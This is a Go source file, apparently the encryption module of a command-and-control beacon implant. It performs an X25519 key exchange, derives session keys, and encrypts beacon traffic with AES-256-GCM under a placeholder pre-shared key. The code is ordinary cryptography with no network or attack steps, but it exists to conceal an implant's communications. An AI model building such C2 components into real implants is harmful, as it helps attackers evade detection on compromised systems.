package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdh"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
)

// PSK must match server/config.py:PSK_HEX
// Override at build time: go build -ldflags="-X main.pskHex=<hex>"
var pskHex = "deadbeefcafebabedeadbeefcafebabedeadbeefcafebabedeadbeefcafebabe"

var psk []byte

// sessionKey is set after a successful X25519 handshake.
// When non-nil, it replaces PSK for all subsequent encryption.
var sessionKey []byte

// keyID is this beacon's public key hex, sent as X-Key-ID header.
var keyID string

func initCrypto() error {
	var err error
	psk, err = hex.DecodeString(pskHex)
	if err != nil {
		return fmt.Errorf("failed to decode PSK: %w", err)
	}
	if len(psk) != 32 {
		return fmt.Errorf("PSK must be 32 bytes, got %d", len(psk))
	}
	return nil
}

// ═══════════════════════════════════════════════════════════════════════
// X25519 Key Exchange
// ═══════════════════════════════════════════════════════════════════════

// GenerateX25519Keypair generates an ephemeral X25519 keypair.
// Returns the private key and hex-encoded public key (64 hex chars).
func GenerateX25519Keypair() (*ecdh.PrivateKey, string, error) {
	privateKey, err := ecdh.X25519().GenerateKey(rand.Reader)
	if err != nil {
		return nil, "", fmt.Errorf("generate x25519 keypair: %w", err)
	}
	publicHex := hex.EncodeToString(privateKey.PublicKey().Bytes())
	return privateKey, publicHex, nil
}

// ComputeSessionKey performs X25519 ECDH and derives a 32-byte AES-256 key.
// Derivation: SHA-256(shared_secret || "c2-framework-v1")
func ComputeSessionKey(privateKey *ecdh.PrivateKey, peerPublicHex string) ([]byte, error) {
	peerPublicBytes, err := hex.DecodeString(peerPublicHex)
	if err != nil {
		return nil, fmt.Errorf("decode peer public key: %w", err)
	}
	peerPublicKey, err := ecdh.X25519().NewPublicKey(peerPublicBytes)
	if err != nil {
		return nil, fmt.Errorf("parse peer public key: %w", err)
	}
	sharedSecret, err := privateKey.ECDH(peerPublicKey)
	if err != nil {
		return nil, fmt.Errorf("ecdh: %w", err)
	}
	// Derive AES key: SHA-256(shared_secret || domain_separator)
	hash := sha256.Sum256(append(sharedSecret, []byte("c2-framework-v1")...))
	return hash[:], nil
}

// ═══════════════════════════════════════════════════════════════════════
// Keyed AES-256-GCM (low-level)
// ═══════════════════════════════════════════════════════════════════════

// aesEncrypt encrypts bytes with AES-256-GCM using the given key.
// Returns "nonce_hex:ciphertext_b64".
func aesEncrypt(plaintext, key []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", fmt.Errorf("aes new cipher: %w", err)
	}
	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", fmt.Errorf("new gcm: %w", err)
	}
	nonce := make([]byte, 12)
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", fmt.Errorf("nonce generation: %w", err)
	}
	ciphertext := aesgcm.Seal(nil, nonce, plaintext, nil)
	encoded := base64.StdEncoding.EncodeToString(ciphertext)
	return fmt.Sprintf("%s:%s", hex.EncodeToString(nonce), encoded), nil
}

// aesDecrypt decrypts a "nonce_hex:ciphertext_b64" string with the given key.
func aesDecrypt(payload string, key []byte) ([]byte, error) {
	parts := split2(payload, ":")
	if len(parts) != 2 {
		return nil, errors.New("invalid encrypted payload format")
	}
	nonce, err := hex.DecodeString(parts[0])
	if err != nil {
		return nil, fmt.Errorf("nonce decode: %w", err)
	}
	ciphertext, err := base64.StdEncoding.DecodeString(parts[1])
	if err != nil {
		return nil, fmt.Errorf("base64 decode: %w", err)
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("aes new cipher: %w", err)
	}
	aesgcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("new gcm: %w", err)
	}
	plaintext, err := aesgcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, fmt.Errorf("decrypt failed: %w", err)
	}
	return plaintext, nil
}

// encryptWithKey marshals and encrypts a value with the given key.
func encryptWithKey(v any, key []byte) (string, error) {
	plaintext, err := json.Marshal(v)
	if err != nil {
		return "", fmt.Errorf("json marshal: %w", err)
	}
	return aesEncrypt(plaintext, key)
}

// decryptWithKey decrypts a payload and unmarshals into v with the given key.
func decryptWithKey(payload string, key []byte, v any) error {
	plaintext, err := aesDecrypt(payload, key)
	if err != nil {
		return err
	}
	return json.Unmarshal(plaintext, v)
}

// ═══════════════════════════════════════════════════════════════════════
// PSK-based Encryption (backwards-compatible wrappers)
// ═══════════════════════════════════════════════════════════════════════

// EncryptJSON encrypts a value as JSON using the global PSK.
func EncryptJSON(v any) (string, error) {
	return encryptWithKey(v, psk)
}

// DecryptJSON decrypts a payload using the global PSK.
func DecryptJSON(payload string, v any) error {
	return decryptWithKey(payload, psk, v)
}

// ═══════════════════════════════════════════════════════════════════════
// Session-key-aware encryption (chooses session key if set, else PSK)
// ═══════════════════════════════════════════════════════════════════════

// encryptPayload encrypts with session key if available, else PSK.
func encryptPayload(v any) (string, error) {
	key := psk
	if sessionKey != nil {
		key = sessionKey
	}
	return encryptWithKey(v, key)
}

// decryptPayload decrypts with session key if available, else PSK.
func decryptPayload(payload string, v any) error {
	key := psk
	if sessionKey != nil {
		key = sessionKey
	}
	return decryptWithKey(payload, key, v)
}

// ═══════════════════════════════════════════════════════════════════════
// Utilities
// ═══════════════════════════════════════════════════════════════════════

func split2(s, sep string) []string {
	for i := 0; i < len(s); i++ {
		if string(s[i]) == sep {
			return []string{s[:i], s[i+1:]}
		}
	}
	return []string{s}
}
